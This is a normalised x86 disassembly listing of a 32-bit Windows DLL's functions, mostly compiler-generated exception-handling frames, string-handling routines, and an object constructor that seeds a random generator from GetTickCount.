sub_10001000
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b3ba
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
mov [ rw-data ] r--data
mov [ ebp - 0x4 ] 0xffffffff
push r-xdata
call sub_1003cdaf
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10001060
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b3f4
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
mov [ rw-data ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ rw-data ] r--data
mov [ ebp - 0x4 ] 0xffffffff
push sub_10053890
call sub_1003cdaf
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_100010d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b424
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
mov [ rw-data ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ rw-data ] r--data
mov [ ebp - 0x4 ] 0xffffffff
push sub_10053840
call sub_1003cdaf
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10001160
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100011b0
push ebp
mov ebp esp
mov eax [ ecx ]
lea edx [ ebp - 0x8 ]
sub esp 0x8
push [ ebp + 0x8 ]
push edx
call [ eax + 0xc ]
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
xor al al
mov esp ebp
pop ebp
retn 0x8
mov eax [ eax ]
cmp eax [ edx ]
jne r-xdata
mov al 0x1
mov esp ebp
pop ebp
retn 0x8
sub_100011f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor al al
pop ebp
retn 0x8
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
mov al 0x1
pop ebp
retn 0x8
sub_10001220
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b229
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push [ ebp + 0xc ]
mov [ ebp - 0x10 ] 0x0
call sub_1003c479
mov esi [ ebp + 0x8 ]
add esp 0x4
test eax eax
mov edx r--data
cmovne edx eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edx ] 0x0
jne r-xdata
mov ecx edx
lea edi [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
push ecx
push edx
mov ecx esi
call sub_100019e0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_100012c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b258
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10001320
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b288
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10001380
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b2c9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] 0x0
mov esi [ ebp + 0x8 ]
cmp eax 0x1
jne r-xdata
push eax
push esi
call sub_10001220
push 0x15
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
push r--data
mov [ esi ] 0x0
call sub_100019e0
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10001400
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b300
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10001470
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b229
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push [ ebp + 0xc ]
mov [ ebp - 0x10 ] 0x0
call sub_1003c4a3
mov esi [ ebp + 0x8 ]
add esp 0x4
test eax eax
mov edx r--data
cmovne edx eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edx ] 0x0
jne r-xdata
mov ecx edx
lea edi [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
push ecx
push edx
mov ecx esi
call sub_100019e0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10001510
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_1003c479
add esp 0x4
test eax eax
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
je r-xdata
mov [ eax + 0x4 ] rw-data
pop esi
pop ebp
retn 0x8
mov [ eax + 0x4 ] rw-data
pop esi
pop ebp
retn 0x8
sub_10001590
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b328
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_10002490
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100015f0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004b35b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x24 ] 0x0
mov eax [ esi + 0x68 ]
je r-xdata
cmp eax [ esi + 0x6c ]
jbe r-xdata
cmp eax [ esi + 0x6c ]
ja r-xdata
cmp [ esi + 0x7c ] 0x0
jne r-xdata
mov [ esi + 0x4 ] 0x1
xor eax eax
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10002a60
test eax eax
jne r-xdata
mov ecx [ esi + 0x8 ]
xor edi edi
mov eax [ ecx ]
call [ eax + 0x10 ]
test eax eax
je r-xdata
imul eax [ esi + 0x5c ] 0x343fd
xor edx edx
mov ecx 0xffff
add eax 0x269ec3
mov [ esi + 0x5c ] eax
shr eax 0x10
div ecx
movzx eax [ esi + 0x80 ]
movzx edi dx
test ax ax
je r-xdata
mov eax 0x1
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_100031e0
test eax eax
jne r-xdata
xor eax eax
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
nop
mov ecx [ esi + 0x8 ]
push edi
mov eax [ ecx ]
call [ eax + 0x4 ]
push 0x30
call sub_1003cdeb
mov ebx eax
add esp 0x4
mov [ esp + 0x10 ] ebx
mov [ esp + 0x20 ] 0x0
test ebx ebx
je r-xdata
mov edi eax
mov ecx [ esi + 0x8 ]
inc edi
mov eax [ ecx ]
call [ eax + 0x10 ]
cmp edi eax
jb r-xdata
mov ecx [ esi + 0x8 ]
push edi
mov eax [ ecx ]
call [ eax + 0x18 ]
test eax eax
jne r-xdata
xor ecx ecx
mov ecx [ esi + 0x8 ]
push ecx
push edi
mov eax [ ecx ]
call [ eax + 0x8 ]
push eax
mov ecx ebx
call sub_10034d10
mov ecx eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
push edi
mov eax [ ecx ]
call [ eax + 0x14 ]
mov ecx eax
mov edx [ eax ]
mov eax [ edx + 0xc ]
call eax
cmp al 0x8
jne r-xdata
xor eax eax
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x8 ]
push edi
mov eax [ ecx ]
call [ eax + 0x1c ]
mov ebx eax
mov ecx ebx
mov edx [ ebx ]
call [ edx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x4 ]
lea edx [ ecx + 0x4 ]
mov eax [ eax + 0x4 ]
add edx eax
xor edx edx
jmp r-xdata
mov [ esp + 0x20 ] 0xffffffff
test ecx ecx
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x10 ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0xc ]
mov edx [ ebx ]
mov ecx ebx
call [ edx + 0x10 ]
cmp eax 0x8
jne r-xdata
mov ecx [ esi + 0x8 ]
push edx
mov eax [ ecx ]
call [ eax + 0xc ]
mov ecx [ esi + 0x8 ]
mov [ esi + 0x7c ] 0x1
mov eax [ ecx ]
call [ eax + 0x8 ]
inc [ esi + 0x70 ]
mov ecx ebx
mov [ esi + 0x68 ] 0x0
mov eax [ ebx ]
push r--data
call [ eax + 0x14 ]
movzx eax [ eax + 0x8 ]
mov [ esi + 0x24 ] ax
test ax ax
jne r-xdata
mov ecx [ esi + 0x8 ]
push edi
mov eax [ ecx ]
call [ eax + 0x20 ]
mov eax 0x1
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
inc [ esi + 0x68 ]
mov [ esi + 0x7c ] 0x0
sub_10001820
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ecx ] 0x0
jne r-xdata
mov edx ecx
push edi
lea edi [ edx + 0x1 ]
xor edx edx
push edx
push ecx
mov ecx esi
call sub_100019e0
mov eax esi
pop esi
pop ebp
retn 0x4
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx edi
pop edi
push edx
push ecx
mov ecx esi
call sub_100019e0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100018b0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
mov ecx [ ebp + 0xc ]
mov edi [ ebx + 0x10 ]
cmp edi ecx
jb r-xdata
push r--data
call sub_1003c5ec
sub edi ecx
cmp [ ebp + 0x10 ] edi
cmovb edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
cmp edi 0xfffffffe
ja r-xdata
lea eax [ edi + ecx ]
cmp [ esi + 0x10 ] eax
jb r-xdata
push r--data
call sub_1003c5be
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1003c5ec
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
jb r-xdata
test edi edi
jne r-xdata
push [ esi + 0x10 ]
mov ecx esi
push edi
call sub_10001c70
mov ecx [ ebp + 0xc ]
test edi edi
je r-xdata
mov edx esi
push ecx
push 0x0
mov ecx esi
mov [ edx + eax ] 0x0
call sub_10001ae0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ esi ]
push ecx
push 0x0
mov ecx esi
mov [ edx + eax ] 0x0
call sub_10001ae0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ebx [ ebx ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ eax ] 0x0
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
push edi
lea eax [ ebx + ecx ]
push eax
push edx
call sub_1003dc80
add esp 0xc
test edi edi
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_100019e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0xfffffffe
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
push r--data
call sub_1003c5be
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push [ esi + 0x10 ]
mov ecx esi
push edi
call sub_10001c70
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov [ eax ] 0x0
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x10 ]
add eax edx
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
push edi
push ebx
push eax
call sub_1003dc80
add esp 0xc
test edi edi
je r-xdata
push [ ebp + 0xc ]
mov eax esi
mov ecx esi
sub ebx eax
push ebx
push esi
call sub_100018b0
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov eax [ esi ]
mov ecx esi
sub ebx eax
push ebx
push esi
call sub_100018b0
pop esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_10001ae0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x10 ]
cmp edi ecx
jb r-xdata
push r--data
call sub_1003c5ec
mov edx [ ebp + 0xc ]
mov eax edi
sub eax ecx
cmp eax edx
ja r-xdata
test edx edx
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
pop edi
pop esi
mov [ eax + ecx ] 0x0
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax + ecx ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
pop ebx
jb r-xdata
push eax
lea eax [ ebx + edx ]
push eax
push ebx
call sub_1003c640
add esp 0xc
sub edi edx
push ebx
lea ebx [ eax + ecx ]
mov eax edi
sub eax ecx
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop edi
pop esi
pop ebp
retn 0x8
sub_10001b80
push ebp
mov ebp esp
cmp [ ecx + 0x14 ] 0x10
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] edx
jb r-xdata
mov [ ecx + edx ] 0x0
pop ebp
retn 0x4
mov eax [ ecx ]
mov [ eax + edx ] 0x0
pop ebp
retn 0x4
sub_10001bb0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xfffffffe
ja r-xdata
push r--data
call sub_1003c5be
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ esi + 0x10 ]
push edi
call sub_10001c70
xor eax eax
cmp eax edi
pop edi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
test edi edi
jne r-xdata
cmp edi 0x10
jae r-xdata
xor eax eax
cmp eax edi
pop edi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
push ebx
mov ebx [ esi + 0x10 ]
cmp edi ebx
cmovb ebx edi
cmp eax 0x10
jb r-xdata
mov [ esi ] 0x0
mov esi [ esi ]
xor eax eax
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] 0xf
cmp eax edi
mov [ ebx + esi ] 0x0
pop ebx
sbb eax eax
pop edi
neg eax
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov [ ebp + 0xc ] eax
test ebx ebx
je r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
push ebx
push eax
push esi
call sub_1003dc80
mov eax [ ebp + 0xc ]
add esp 0xc
sub_10001c70
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b391
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x1c ] esi
mov eax [ ebp + 0x8 ]
mov edi eax
or edi 0xf
cmp edi 0xfffffffe
jbe r-xdata
mov ebx [ esi + 0x14 ]
mov ecx ebx
shr ecx 0x1
mov eax 0xaaaaaaab
mul edi
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov edi eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x1 ]
push eax
lea ecx [ ebp - 0x11 ]
call sub_10001de0
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax 0xfffffffe
sub eax ecx
cmp ebx eax
lea edi [ ecx + ebx ]
jbe r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov edi 0xfffffffe
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] esi
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x18 ]
mov [ esi ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
cmp edi 0x10
jb r-xdata
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov [ esi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi [ esi ]
push ebx
push ecx
push eax
call sub_1003dc80
add esp 0xc
test ebx ebx
je r-xdata
sub_10001daf
mov esi [ ebp - 0x1c ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
push 0x0
push 0x0
call sub_1003e35b
int3
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10001de0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebp
retn 0x4
cmp eax 0xffffffff
ja r-xdata
call sub_1003c58d
push eax
call sub_1003cdeb
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
sub_10001e20
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10001e50
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b4c4
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] 0x0
mov esi [ ebp + 0x8 ]
push 0xffffffff
lea edx [ eax + eax * 4 ]
mov eax [ ecx + 0xc ]
lea ecx [ esi + 0x10 ]
push 0x0
lea edx [ eax + edx * 8 ]
mov ax [ edx ]
mov [ esi ] ax
mov eax [ edx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ edx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ edx + 0xc ]
add edx 0x10
mov [ esi + 0xc ] eax
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push edx
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10001ef0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b4eb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x10 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x10 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10001f70
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b5df
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x38 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
mov [ esi ] r--data
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] eax
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x34 ] eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] eax
mov [ ebp - 0x4 ] 0x3
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] eax
mov [ ebp - 0x4 ] 0x4
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] eax
mov [ esi + 0x54 ] eax
mov [ ebp - 0x4 ] 0x5
mov [ esi + 0x58 ] r--data
call [ GetTickCount@IAT ]
mov [ esi + 0x5c ] eax
mov [ ebp - 0x4 ] 0x6
sub esp 0x18
mov eax [ ebp + 0xc ]
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp - 0x34 ] esp
mov [ eax + 0x14 ] 0xf
mov [ eax + 0x10 ] 0x0
mov [ eax ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
mov eax esp
push ecx
push ebx
mov ecx eax
call sub_100019e0
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x4 ] 0x6
lea ecx [ ebp - 0x2c ]
call sub_1003c0f0
add esp 0x18
mov ebx eax
mov [ ebp - 0x4 ] 0x8
cmp edi ebx
je r-xdata
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0x7
push 0x20
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
mov [ esi + 0x24 ] ax
mov [ esi + 0x4 ] eax
mov [ esi + 0x60 ] eax
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x4 ] 0x9
test edi edi
je r-xdata
push [ ebp - 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov ecx edi
push ebx
mov [ edi ] ax
call sub_10003980
push [ edi ]
call j_sub_1003f3e3#2
add esp 0x4
xor edi edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0xa
mov [ edi ] r--data
mov [ edi + 0x8 ] r--data
mov [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0xb
mov [ edi + 0x18 ] 0x31
mov [ ebp - 0x4 ] 0x9
jmp r-xdata
push 0x40
mov [ esi + 0x60 ] edi
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0xc
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ ebp - 0x4 ] 0x6
mov ecx [ esi + 0x60 ]
test ecx ecx
je r-xdata
xor ebx ebx
push 0x44b90
push 0x795
mov ecx eax
call sub_1002bb80
mov ebx eax
jmp r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x47c79
mov [ ebp - 0x4 ] 0xe
mov [ eax ] r--data
mov [ eax + 0x8 ] 0x3be
mov [ eax + 0xc ] 0x2658
mov [ eax + 0x10 ] 0x2493
mov [ ebp - 0x4 ] 0xd
jmp r-xdata
mov [ ebp - 0x4 ] 0x6
push 0x14
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0xd
test eax eax
je r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x45eab
mov [ ebp - 0x4 ] 0x10
mov [ eax ] r--data
mov [ eax + 0x8 ] 0xf2d
mov [ eax + 0xc ] 0x4849
mov [ eax + 0x10 ] 0x4bac
mov [ ebp - 0x4 ] 0xf
jmp r-xdata
mov [ ebp - 0x4 ] 0x6
lea ecx [ ebx + 0x30 ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100038e0
push 0x14
call sub_1003cdeb
add esp 0x4
